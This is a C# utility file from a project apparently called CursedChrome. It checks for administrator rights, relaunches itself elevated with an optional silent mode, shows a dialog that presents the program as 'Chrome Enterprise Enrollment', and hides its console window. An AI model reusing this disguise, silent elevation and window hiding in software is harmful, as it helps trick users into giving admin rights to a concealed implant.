using System;
using System.Diagnostics;
using System.Security.Principal;
using System.Windows.Forms;
using CursedChrome.Core;

namespace CursedChrome.Utils
{
    public static class PrivilegeElevation
    {
        public static bool IsAdministrator()
        {
            try
            {
                WindowsIdentity identity = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch (Exception ex)
            {
                Logger.LogError("IsAdministrator check failed", ex);
                return false;
            }
        }
        
        public static void RequestElevation(bool silent)
        {
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = Application.ExecutablePath,
                    UseShellExecute = true,
                    Verb = "runas",
                    Arguments = silent ? "/silent" : ""
                };
                
                Process.Start(startInfo);
                Logger.Log("Elevation requested - exiting current instance");
                
                Environment.Exit(0);
            }
            catch (System.ComponentModel.Win32Exception)
            {
                Logger.LogWarning("User declined UAC prompt");
                
                if (!silent)
                {
                    MessageBox.Show(
                        "Administrator privileges are required for Chrome enrollment.\n\nOperation cancelled.",
                        "Chrome Enterprise Enrollment",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Error
                    );
                }
                
                Environment.Exit(1);
            }
            catch (Exception ex)
            {
                Logger.LogError("Elevation request failed", ex);
                Environment.Exit(1);
            }
        }
    }
    
    public static class Win32
    {
        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();
        
        [System.Runtime.InteropServices.DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        
        private const int SW_HIDE = 0;
        
        public static void HideConsoleWindow()
        {
            try
            {
                IntPtr handle = GetConsoleWindow();
                if (handle != IntPtr.Zero)
                {
                    ShowWindow(handle, SW_HIDE);
                }
            }
            catch (Exception ex)
            {
                Logger.LogWarning($"Failed to hide console: {ex.Message}");
            }
        }
    }
}
